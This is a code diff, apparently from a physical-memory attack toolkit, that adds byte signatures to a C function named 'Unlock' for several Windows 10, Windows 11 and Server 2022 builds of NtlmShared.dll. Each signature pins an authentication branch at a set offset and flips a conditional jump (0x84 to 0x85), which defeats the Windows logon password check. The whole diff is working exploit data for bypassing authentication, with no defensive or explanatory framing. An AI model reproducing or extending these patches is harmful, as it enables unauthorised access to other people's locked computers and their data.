@@ -129,7 +129,7 @@ NTSTATUS Unlock_FindAndPatch(_In_ PKERNEL_FUNCTIONS2 fnk2, _Inout_ PBYTE pbPages
 	return E_FAIL;
 }
 
-#define NUMBER_OF_SIGNATURES 15
+#define NUMBER_OF_SIGNATURES 20
 NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 {
 	SIGNATURE oSigs[NUMBER_OF_SIGNATURES] = {
@@ -223,7 +223,38 @@ NTSTATUS Unlock(_In_ QWORD qwAddrNtosBase)
 			{.cbOffset = 0x426,.cb = 5,.pb = { 0x48, 0xff, 0x15, 0x53, 0x20 } },
 			{.cbOffset = 0x435,.cb = 6,.pb = { 0x0f, 0x84, 0xba, 0xfa, 0xff, 0xff } },
 			{.cbOffset = 0x435,.cb = 2,.pb = { 0x0f, 0x85 } } }
-		}
+		},
+		// Windows 10 x64 [NtlmShared.dll (2022-08-04)/10.0.19041.1889]
+		{.chunk = {
+			{.cbOffset = 0x4B6,.cb = 5,.pb = { 0x48, 0xff, 0x15, 0xc3, 0x1f } },
+			{.cbOffset = 0x4c5,.cb = 6,.pb = { 0x0f, 0x84, 0xba, 0xfa, 0xff, 0xff } },
+			{.cbOffset = 0x4c5,.cb = 2,.pb = { 0x0f, 0x85 } } }
+		},
+		// Windows Server2022 x64 [NtlmShared.dll (2022-08-04)/10.0.20348.887]
+		{.chunk = {
+			{.cbOffset = 0xa6e,.cb = 5,.pb = { 0x48, 0xff, 0x15, 0xb3, 0x28 } },
+			{.cbOffset = 0xa7d,.cb = 6,.pb = { 0x0f, 0x84, 0xb2, 0xfa, 0xff, 0xff } },
+			{.cbOffset = 0xa7d,.cb = 2,.pb = { 0x0f, 0x85 } } }
+		},
+		// Windows 11 x64 [NtlmShared.dll (2021-06-05)/10.0.22000.1]
+		{ .chunk = {
+			{.cbOffset = 0xf8b,.cb = 5,.pb = { 0x48, 0x8b, 0xcb, 0x48, 0xff } },
+			{.cbOffset = 0xf9d,.cb = 6,.pb = { 0x0f, 0x84, 0xb2, 0xfa, 0xff, 0xff } },
+			{.cbOffset = 0xf9d,.cb = 2,.pb = { 0x0f, 0x85 } } }
+		},
+		// Windows 11 x64 [NtlmShared.dll (2022-08-04)/10.0.22000.856]
+		{ .chunk = {
+			{.cbOffset = 0x00b,.cb = 5,.pb = { 0x48, 0x8b, 0xcb, 0x48, 0xff } },
+			{.cbOffset = 0x01d,.cb = 6,.pb = { 0x0f, 0x84, 0xb2, 0xfa, 0xff, 0xff } },
+			{.cbOffset = 0x01d,.cb = 2,.pb = { 0x0f, 0x85 } } }
+		},
+		// Windows 11 x64 [NtlmShared.dll (2022-08-05)/10.0.22621.382]
+		// Windows 11 x64 [NtlmShared.dll (2022-09-27)/10.0.22621.608]
+		{ .chunk = {
+			{.cbOffset = 0xFBD,.cb = 5,.pb = { 0x48, 0xff, 0x15, 0x3c, 0x23 } },
+			{.cbOffset = 0xFCC,.cb = 6,.pb = { 0x0f, 0x85, 0xc4, 0xfa, 0xff, 0xff } },
+			{.cbOffset = 0xFCC,.cb = 2,.pb = { 0x0f, 0x85 } } }
+		},
 	};
 	KERNEL_FUNCTIONS2 fnk2;
 	PPHYSICAL_MEMORY_RANGE pMemMap, pMM;
